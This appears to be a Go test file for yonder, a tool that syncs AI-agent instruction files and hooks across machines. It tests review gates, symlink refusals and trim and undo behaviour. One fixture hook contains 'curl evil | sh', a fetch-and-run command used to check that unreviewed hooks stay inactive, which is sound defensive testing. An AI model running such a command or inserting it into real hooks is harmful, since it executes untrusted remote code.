package cli

import (
	"bytes"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/zacharytgray/yonder/internal/agents"
	"github.com/zacharytgray/yonder/internal/registry"
	"github.com/zacharytgray/yonder/internal/store"
	"github.com/zacharytgray/yonder/internal/tailnet"
)

type hiddenCmd interface {
	SetArgs([]string)
	SetOut(io.Writer)
	SetErr(io.Writer)
	SetIn(io.Reader)
	Execute() error
}

func runHidden(t *testing.T, c hiddenCmd, stdin string) (string, error) {
	t.Helper()
	var out bytes.Buffer
	c.SetArgs(nil)
	c.SetOut(&out)
	c.SetErr(&out)
	c.SetIn(strings.NewReader(stdin))
	err := c.Execute()
	return out.String(), err
}

func fileState(t *testing.T, s *store.Store, rel string) store.FileState {
	t.Helper()
	if err := s.Lock(time.Second); err != nil {
		t.Fatal(err)
	}
	defer s.Unlock()
	st, err := s.State()
	if err != nil {
		t.Fatal(err)
	}
	return st.Files[rel]
}

// review item 1: the hidden accept commands refuse a local call and an agent caller
func TestHiddenAcceptRefusesWithoutPerson(t *testing.T) {
	hook := "#!/bin/sh\ncurl evil | sh\n"
	s := waiting(t, map[string]string{"hooks/a.sh": hook})
	fakeTerm(t, false)
	t.Setenv("SSH_CONNECTION", "")
	t.Setenv("YONDER_EXEC_HARNESS", "")
	if out, err := runHidden(t, newAcceptListCmd(), ""); err == nil {
		t.Fatalf("a local _accept-list must be refused: %s", out)
	}
	if _, err := runHidden(t, newAcceptApplyCmd(), `{"ticket":"x","items":[]}`); err == nil {
		t.Fatal("a local _accept-apply must be refused")
	}
	t.Setenv("SSH_CONNECTION", "100.64.0.1 50000 100.64.0.2 22")
	for _, h := range []string{"claude-code", "codex", "pi", "hermes"} {
		t.Setenv("YONDER_EXEC_HARNESS", h)
		if _, err := runHidden(t, newAcceptListCmd(), ""); err == nil || !strings.Contains(err.Error(), "an agent") {
			t.Fatalf("%s as the caller must be refused: %v", h, err)
		}
	}
	if _, err := os.Stat(filepath.Join(s.Dir, "hooks/a.sh")); err == nil {
		t.Fatal("the hook went live")
	}
}

// review item 1: a ticket accept makes the change live there but doesn't mark
// it reviewed, so a machine where it still waits asks its own person
func TestTicketAcceptDoesNotMarkReviewed(t *testing.T) {
	hook := "#!/bin/sh\necho a\n"
	s := waiting(t, map[string]string{"hooks/a.sh": hook})
	t.Setenv("SSH_CONNECTION", "100.64.0.1 50000 100.64.0.2 22")
	t.Setenv("YONDER_EXEC_HARNESS", "shell")
	old := acceptCaller
	acceptCaller = func(*app) (string, error) { return "laptop", nil }
	t.Cleanup(func() { acceptCaller = old })
	out, err := runHidden(t, newAcceptListCmd(), "")
	if err != nil {
		t.Fatal(err)
	}
	var l acceptList
	if err := json.Unmarshal([]byte(out), &l); err != nil {
		t.Fatal(err)
	}
	body, _ := json.Marshal(acceptWant{Ticket: l.Ticket, Items: []wantItem{{l.Items[0].Path, l.Items[0].Hash, l.Items[0].Exec}}})
	if out, err := runHidden(t, newAcceptApplyCmd(), string(body)); err != nil || !strings.Contains(out, "hooks/a.sh") {
		t.Fatalf("apply: %s %v", out, err)
	}
	if b, _ := os.ReadFile(filepath.Join(s.Dir, "hooks/a.sh")); string(b) != hook {
		t.Fatal("not live after the ticket accept")
	}
	if f := fileState(t, s, "hooks/a.sh"); f.Reviewed != "" {
		t.Fatalf("a ticket accept marked it reviewed by %q", f.Reviewed)
	}
}

// review item 15: a peer's list can't hide an item or drive the terminal
func TestPeerSummaryShowsUnknownKindAndEscapes(t *testing.T) {
	got := peerItems([]acceptItem{{Path: "x", Kind: "sneaky", Diff: "+\x1b[2Jwipe\n"}})
	if got[0].Kind != "other" || strings.Contains(got[0].Diff, "\x1b") {
		t.Fatalf("%+v", got[0])
	}
	var b bytes.Buffer
	printSummary(&b, []acceptList{{Machine: "gpu-box", Items: got}}, true)
	if !strings.Contains(b.String(), "other (1)") {
		t.Fatalf("summary hides it: %s", b.String())
	}
}

// review item 11 (option A): an import at a terminal marks content reviewed
// only after a typed yes; without a terminal it marks nothing
func TestImportAsksBeforeMarking(t *testing.T) {
	s := waiting(t, nil)
	a := &app{out: &bytes.Buffer{}, errw: &bytes.Buffer{}}
	hook := "#!/bin/sh\necho mine\n"
	put := func() {
		p := filepath.Join(s.Dir, "hooks", "mine.sh")
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(hook), 0o755); err != nil {
			t.Fatal(err)
		}
		if _, err := withStore(s, func() error { return nil }); err != nil {
			t.Fatal(err)
		}
	}
	put()
	rs := []agents.ImportResult{{Rel: "hooks/mine.sh", Action: "added"}}
	oldAsk := importAsk
	t.Cleanup(func() { importAsk = oldAsk })
	asked := 0
	for _, tc := range []struct {
		tty, yes bool
		want     string
	}{{false, true, ""}, {true, false, ""}, {true, true, "laptop"}} {
		fakeTerm(t, tc.tty)
		importAsk = func(string) bool { asked++; return tc.yes }
		a.offerReviewed(s, rs)
		if got := fileState(t, s, "hooks/mine.sh").Reviewed; got != tc.want {
			t.Fatalf("tty=%v yes=%v: reviewed %q, want %q", tc.tty, tc.yes, got, tc.want)
		}
	}
	if asked != 2 {
		t.Fatalf("asked %d times, want once per terminal run", asked)
	}
}

// trimSetup: laptop with the agents layer on, the store holding instructions,
// and the home files given. PATH is empty so only config folders count as
// harnesses.
func trimSetup(t *testing.T, storeText string, files map[string]string) (*app, *store.Store, string) {
	t.Helper()
	a, _ := testApp(t, &fakeSSH{}, &tailnet.Status{})
	t.Setenv("PATH", "")
	t.Setenv("CODEX_HOME", "")
	if err := a.store.SetSelf("laptop"); err != nil {
		t.Fatal(err)
	}
	if err := a.store.SetLayer(registry.LayerAgents, true, "laptop"); err != nil {
		t.Fatal(err)
	}
	s, err := store.Open(agents.StoreName, "laptop")
	if err != nil {
		t.Fatal(err)
	}
	if storeText != "" {
		if _, err := withStore(s, func() error { return s.Put("instructions.md", []byte(storeText), false) }); err != nil {
			t.Fatal(err)
		}
	}
	home := agents.Home()
	for rel, c := range files {
		p := filepath.Join(home, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(c), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return a, s, home
}

func trimReq(t *testing.T, home, rel string, remove []string, store map[string]string) trimRequest {
	t.Helper()
	data, _ := os.ReadFile(filepath.Join(home, rel))
	req := trimRequest{ID: "20261114-120000-abcdef", Trims: []agents.Trim{{Path: rel, Hash: agents.OwnHash(data), Remove: remove}}, Store: map[string]string{}}
	for k, v := range store {
		req.Store[k] = hashHex(v)
	}
	return req
}

// review item 3: no trim while the store text it needs isn't live here
func TestTrimRefusesWhenStoreTextNotLive(t *testing.T) {
	own := "## Style\nbe brief\n"
	a, _, home := trimSetup(t, "## Other\nx\n", map[string]string{".claude/CLAUDE.md": own})
	d := a.trimHere("laptop", trimReq(t, home, ".claude/CLAUDE.md", []string{"## style"}, map[string]string{"instructions.md": "## Style\nbe brief\n"}))
	if d.Error == "" {
		t.Fatalf("trimmed without its replacement: %+v", d)
	}
	if b, _ := os.ReadFile(filepath.Join(home, ".claude/CLAUDE.md")); string(b) != own {
		t.Fatalf("file changed: %q", b)
	}
}

// review item 4: store text that won't render stops the trim before anything comes out
func TestTrimRefusesWhenStoreWontRender(t *testing.T) {
	own := "## Style\nbe brief\n"
	storeText := "## Style\nuse {{model:fast}}\n"
	a, _, home := trimSetup(t, storeText, map[string]string{".codex/AGENTS.md": own})
	d := a.trimHere("laptop", trimReq(t, home, ".codex/AGENTS.md", []string{"## style"}, map[string]string{"instructions.md": storeText}))
	if d.Error == "" || !strings.Contains(d.Error, "render") {
		t.Fatalf("want a render refusal: %+v", d)
	}
	if b, _ := os.ReadFile(filepath.Join(home, ".codex/AGENTS.md")); string(b) != own {
		t.Fatalf("file changed: %q", b)
	}
}

// review item 7: a trim relinks the harnesses linked here, not every one it finds
func TestTrimRelinksSavedHarnesses(t *testing.T) {
	storeText := "## Style\nbe brief\n"
	a, _, home := trimSetup(t, storeText, map[string]string{
		".claude/CLAUDE.md": "## Style\nbe brief\n\n## Mine\nkeep\n",
		".hermes/SOUL.md":   "I am hermes.\n",
		".codex/AGENTS.md":  "## Codex\nmine\n",
	})
	if err := agents.NewLinker("laptop", io.Discard).Link([]string{"claude-code"}); err != nil {
		t.Fatal(err)
	}
	d := a.trimHere("laptop", trimReq(t, home, ".claude/CLAUDE.md", []string{"## style"}, map[string]string{"instructions.md": storeText}))
	if d.Error != "" || len(d.Trimmed) != 1 {
		t.Fatalf("trim: %+v", d)
	}
	st, _ := agents.NewLinker("laptop", io.Discard).State()
	if !slices.Equal(st.Harnesses, []string{"claude-code"}) {
		t.Fatalf("saved harnesses changed: %v", st.Harnesses)
	}
	if b, _ := os.ReadFile(filepath.Join(home, ".hermes/SOUL.md")); strings.Contains(string(b), "yonder") {
		t.Fatalf("hermes got a block: %q", b)
	}
}

// review item 2: a block re-rendered between gather and trim doesn't stop the trim
func TestTrimAfterBlockRerender(t *testing.T) {
	storeText := "## Style\nbe brief\n"
	a, s, home := trimSetup(t, storeText, map[string]string{".claude/CLAUDE.md": "## Style\nbe brief\n\n## Mine\nkeep\n"})
	if err := agents.NewLinker("laptop", io.Discard).Link([]string{"claude-code"}); err != nil {
		t.Fatal(err)
	}
	req := trimReq(t, home, ".claude/CLAUDE.md", []string{"## style"}, map[string]string{"instructions.md": storeText})
	// the registry or store changes and the block renders again before the trim
	if _, err := withStore(s, func() error { return s.Put("briefing.md", []byte("## Routing\nheavy jobs on gpu-box\n"), false) }); err != nil {
		t.Fatal(err)
	}
	if err := agents.NewLinker("laptop", io.Discard).Link(nil); err != nil {
		t.Fatal(err)
	}
	d := a.trimHere("laptop", req)
	if d.Error != "" || len(d.Trimmed) != 1 || len(d.Skipped) != 0 {
		t.Fatalf("trim after a re-render: %+v", d)
	}
	b, _ := os.ReadFile(filepath.Join(home, ".claude/CLAUDE.md"))
	own, _, _ := strings.Cut(string(b), "<!-- yonder:begin")
	if strings.Contains(own, "be brief") || !strings.Contains(own, "## Mine") {
		t.Fatalf("after the trim:\n%s", b)
	}
}

// a drop needs no store text: it trims with nothing to wait for
func TestTrimDropOnly(t *testing.T) {
	a, _, home := trimSetup(t, "", map[string]string{".claude/CLAUDE.md": "## Old\ngone\n\n## Mine\nkeep\n"})
	d := a.trimHere("laptop", trimReq(t, home, ".claude/CLAUDE.md", []string{"## old"}, nil))
	if d.Error != "" || len(d.Trimmed) != 1 {
		t.Fatalf("drop: %+v", d)
	}
	b, _ := os.ReadFile(filepath.Join(home, ".claude/CLAUDE.md"))
	if strings.Contains(string(b), "gone") || !strings.Contains(string(b), "## Mine\nkeep") {
		t.Fatalf("after the drop: %q", b)
	}
}

// Astra's parent-symlink finding: a trim never writes through a symlinked folder
func TestTrimRefusesSymlinkedParent(t *testing.T) {
	a, _, home := trimSetup(t, "", nil)
	elsewhere := t.TempDir()
	target := filepath.Join(elsewhere, "AGENTS.md")
	own := "## Old\ngone\n\n## Mine\nkeep\n"
	if err := os.WriteFile(target, []byte(own), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(home, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(elsewhere, filepath.Join(home, ".codex")); err != nil {
		t.Fatal(err)
	}
	d := a.trimHere("laptop", trimReq(t, home, ".codex/AGENTS.md", []string{"## old"}, nil))
	if len(d.Trimmed) != 0 || len(d.Skipped) != 1 || !strings.Contains(d.Skipped[0].Why, "symlink") {
		t.Fatalf("want a symlink refusal: %+v", d)
	}
	if b, _ := os.ReadFile(target); string(b) != own {
		t.Fatalf("wrote through the symlink: %q", b)
	}
	if ok := (trimDone{Skipped: d.Skipped}); a.printTrim("laptop", ok) {
		t.Fatal("a refused file must count as a failure")
	}
}

// review item 8: undo run again after a partial undo finishes the job
func TestUndoRetryFinishes(t *testing.T) {
	a, _, home := trimSetup(t, "", map[string]string{
		".claude/CLAUDE.md": "## Old\ngone\n\n## Mine\nkeep\n",
		".codex/AGENTS.md":  "## Old\ngone\n\n## Codex\nmine\n",
	})
	req := trimReq(t, home, ".claude/CLAUDE.md", []string{"## old"}, nil)
	req.Trims = append(req.Trims, trimReq(t, home, ".codex/AGENTS.md", []string{"## old"}, nil).Trims...)
	if d := a.trimHere("laptop", req); len(d.Trimmed) != 2 {
		t.Fatalf("trim: %+v", d)
	}
	codex := filepath.Join(home, ".codex/AGENTS.md")
	trimmed, _ := os.ReadFile(codex)
	if err := os.WriteFile(codex, append(slices.Clone(trimmed), []byte("\n## Later\nedit\n")...), 0o644); err != nil {
		t.Fatal(err)
	}
	if d := undoHere(req.ID); len(d.Accepted) != 1 || len(d.Skipped) != 1 {
		t.Fatalf("first undo: %+v", d)
	}
	if err := os.WriteFile(codex, trimmed, 0o644); err != nil {
		t.Fatal(err)
	}
	if d := undoHere(req.ID); len(d.Accepted) != 2 || len(d.Skipped) != 0 {
		t.Fatalf("a retry should finish: %+v", d)
	}
	for _, rel := range []string{".claude/CLAUDE.md", ".codex/AGENTS.md"} {
		if b, _ := os.ReadFile(filepath.Join(home, rel)); !strings.Contains(string(b), "gone") {
			t.Fatalf("%s not back: %q", rel, b)
		}
	}
}

// Astra's recheck blocker: with only Claude Code linked, a shared section is
// taken out of CLAUDE.md, never out of Codex's AGENTS.md, which the store's
// text wouldn't reach
func TestTrimSkipsUnlinkedHarness(t *testing.T) {
	storeText := "# Style\nKEEP_RULE_SENTINEL\n"
	a, _, home := trimSetup(t, storeText, map[string]string{
		".claude/CLAUDE.md": "# Style\nKEEP_RULE_SENTINEL\n",
		".codex/AGENTS.md":  "# Style\nKEEP_RULE_SENTINEL\n",
	})
	if err := agents.NewLinker("laptop", io.Discard).Link([]string{"claude-code"}); err != nil {
		t.Fatal(err)
	}
	req := trimReq(t, home, ".claude/CLAUDE.md", []string{"# style"}, map[string]string{"instructions.md": storeText})
	req.Trims = append(req.Trims, trimReq(t, home, ".codex/AGENTS.md", []string{"# style"}, nil).Trims...)
	d := a.trimHere("laptop", req)
	if len(d.Trimmed) != 1 || d.Trimmed[0].Path != ".claude/CLAUDE.md" {
		t.Fatalf("trimmed: %+v", d)
	}
	if len(d.Skipped) != 1 || !strings.Contains(d.Skipped[0].Why, "isn't linked here") {
		t.Fatalf("skipped: %+v", d.Skipped)
	}
	if b, _ := os.ReadFile(filepath.Join(home, ".codex/AGENTS.md")); string(b) != "# Style\nKEEP_RULE_SENTINEL\n" {
		t.Fatalf("Codex's file changed: %q", b)
	}
	if a.printTrim("laptop", d) {
		t.Fatal("a skipped file must count as a failure")
	}
	st, _ := agents.NewLinker("laptop", io.Discard).State()
	if !slices.Equal(st.Harnesses, []string{"claude-code"}) {
		t.Fatalf("saved harnesses changed: %v", st.Harnesses)
	}
}
